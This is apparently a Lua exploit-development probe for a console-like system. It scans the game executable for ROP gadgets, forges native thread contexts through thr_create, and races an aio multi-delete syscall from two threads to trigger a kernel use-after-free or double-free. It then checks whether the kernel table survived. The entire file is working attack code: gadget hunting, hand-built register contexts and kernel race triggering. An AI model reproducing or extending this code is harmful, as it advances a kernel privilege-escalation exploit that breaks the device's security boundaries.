-- CRASH_CLASS: HIGH
-- PROBE 713a: the aio delete race, run from two native threads.
--
-- Context: probe 712c proved a thr_create child can issue a syscall: RIP is
-- syscall.pipe.fn_addr, RAX is the number, and the syscall returns into a
-- gadget the child's own stack points at (it wrote its own pid with getpid).
-- 509b showed two *Lua* threads cannot do this - the loader serialises syscalls
-- and a helper issuing them kills the process - which is why every earlier
-- delete race was a spawn-latency race and every "double success" was the
-- status-zero lie.
--
-- This probe does the same delete from two native children. Each child deletes a
-- whole 8-id block in one call, so the handler loops over ids and the window
-- stays open long enough to overlap.
--
-- Each child exits cleanly: after the delete it returns into pop_rax;ret with
-- 431 (thr_exit), so no spinning thread is left behind.
--
-- The parent pre-fills both status pages with 0x77777777, so "both 0" means the
-- kernel really wrote 0 twice (not an untouched page), then runs a health cycle
-- to see whether the table survived.

print("=== PROBE 713a: native-thread aio delete race ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function q(v) return string.format("0x%X", to_num(v)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] trampoline=" .. q(fn) .. " pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

-- eboot + gadgets (read_buffer, binary-safe)
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
print("[A] eboot=" .. q(ebase))
local function find_pat(base, limit, pat)
    local chunk = 0x1000
    local off = 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
print("[A] jmp$=" .. q(jmp_g or 0) .. " pop rax;ret=" .. q(pop_rax or 0))
if not jmp_g or not pop_rax then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

-- [B] create 8 polled ids
local IDS = 8
local data = mmap(page)
local outid = mmap(page)
for i=0,IDS*0x28-4,4 do wd(data+i, 0) end
local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(IDS), uint64(1), uint64(outid)) end)
local base = rd(outid) or 0
print(string.format("[B] create ok=%s rv=%s base=0x%X ids=%d", tostring(okc), tostring(rvc), base, IDS))
if base == 0 then print("[B] create failed") return end

local idpage_a = mmap(page)
local idpage_b = mmap(page)
local stat_a = mmap(page)
local stat_b = mmap(page)
for i=0,IDS-1 do
    wd(idpage_a + i*4, base + i*0x10000)
    wd(idpage_b + (IDS-1-i)*4, base + i*0x10000)
    wd(stat_a + i*4, 0x77777777)
    wd(stat_b + i*4, 0x77777777)
end

local poll_ok = 0
local pout = mmap(page)
for i=0,IDS-1 do
    wd(idpage_a+i*4, base+i*0x10000)
    local okp, rvp = pcall(function() return mk(664)(uint64(idpage_a+i*4), uint64(1), uint64(pout)) end)
    if okp and to_num(rvp) == 0 and (rd(pout) or 0) % 0x10000 == 3 then poll_ok = poll_ok + 1 end
end
print(string.format("[B] polled %d/%d", poll_ok, IDS))

-- [C] two children, each deleting all 8 ids
local C = {MAGIC=0x108, FLAGS=0x0D0, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
           RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local tids = {}
local ok_all = true
for k=1,2 do
    local stack = mmap(page*4)
    local top = stack + page*4 - 0x100
    wq(top,    uint64(pop_rax))
    wq(top+8,  uint64(431))
    wq(top+16, uint64(fn))
    wq(top+24, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+C.MAGIC, uint64(0x480))
    wd(ctx+C.FLAGS, 0)
    wq(ctx+C.TYPE, uint64(0x10000))
    wq(ctx+C.CS, uint64(0x43))
    wq(ctx+C.SS, uint64(0x3B))
    wq(ctx+C.RIP, uint64(fn))
    wq(ctx+C.RSP, uint64(top))
    wq(ctx+C.RDI, uint64(k==1 and idpage_a or idpage_b))
    wq(ctx+C.RSI, uint64(IDS))
    wq(ctx+C.RDX, uint64(k==1 and stat_a or stat_b))
    wq(ctx+C.RAX, uint64(662))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    tids[k] = rq(tb) or 0
    print(string.format("[C] child %d ok=%s rv=%s tid=%s", k, tostring(ok), tostring(to_num(rv)), q(tids[k])))
    if not ok then ok_all = false end
end
if not ok_all then print("[C] spawn failed") return end

local ts = memory.alloc(16)
wq(ts,0); wq(ts+8,300000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)

local doubles, missing, other = 0, 0, 0
local rows = {}
for i=0,IDS-1 do
    local a = rd(stat_a+i*4) or 0
    local b = rd(stat_b+(IDS-1-i)*4) or 0
    table.insert(rows, string.format("%d:%08X/%08X", i, a, b))
    if a==0 and b==0 then doubles = doubles + 1
    elseif a==0x77777777 or b==0x77777777 then missing = missing + 1
    elseif a~=0 and b~=0 and a~=0x80020003 and b~=0x80020003 then other = other + 1 end
end
print("[D] " .. table.concat(rows, " "))
print(string.format("[D] both-zero=%d untouched=%d other=%d", doubles, missing, other))

-- [D] health: eight fresh create/poll/delete pairs
local bad = 0
for n=1,8 do
    local d2 = mmap(page)
    local o2 = mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(d2), uint64(1), uint64(1), uint64(o2)) end)
    local id = rd(o2) or 0
    local s2 = mmap(page)
    wd(s2, 0x77777777)
    local ok2, rv2 = pcall(function() return mk(662)(uint64(o2), uint64(1), uint64(s2)) end)
    local st = rd(s2) or 0
    if not (ok1 and ok2 and to_num(rv1)==0 and to_num(rv2)==0 and st==0) then
        bad = bad + 1
        print(string.format("    pair %d bad: create rv=%s id=%X delete rv=%s status=%08X", n, tostring(rv1), id, tostring(rv2), st))
    end
end
print(string.format("[E] health bad=%d/8", bad))
print("[Z] alive=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
